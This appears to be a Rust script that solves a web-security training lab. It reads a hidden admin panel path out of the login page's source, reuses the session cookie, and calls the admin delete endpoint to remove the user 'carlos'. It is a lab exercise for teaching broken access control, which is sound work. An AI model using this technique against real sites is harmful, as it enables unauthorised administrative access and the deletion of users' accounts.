/*************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 4/9/2023
*
* Lab: Unprotected admin functionality with unpredictable URL
*
* Steps: 1. Fetch the /login page
*        2. Extract the admin panel path from the source code
*        3. Fetch the admin panel
*        4. Delete carlos
*
**************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a0d00eb04df6a08802c99a9000300d8.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{} ", "1. Fetching /login page..".white());
    io::stdout().flush();

    // fetch /login page
    let get_login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch /login page".red()));

    println!("{}", "OK".green());
    print!(
        "{} ",
        "2. Extracting the admin panel path from the source code and the..".white()
    );
    io::stdout().flush();

    // extract session cookie
    let session = extract_session_cookie(get_login_page.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract the session cookie".red()
    ));

    // extract admin panel path from source code
    let body = get_login_page.text().unwrap();
    let admin_panel_path = capture_pattern("'(/admin-.*)'", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the admin panel path".red()
    ));

    println!("{} => {}", "OK".green(), admin_panel_path.yellow());
    print!("{} ", "3. Fetching the admin panel..".white());
    io::stdout().flush();

    // fetch the admin panel
    // this step in not necessary in the script, you can do step 4 directly
    // it's only a must when solving the lab using the browser
    let admin_panel = client
        .get(format!("{url}{admin_panel_path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));

    println!("{}", "OK".green());
    print!("{} ", "4. Deleting carlos..".white());
    io::stdout().flush();

    // delete carlos
    client
        .get(format!("{url}{admin_panel_path}/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to delete carlos".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
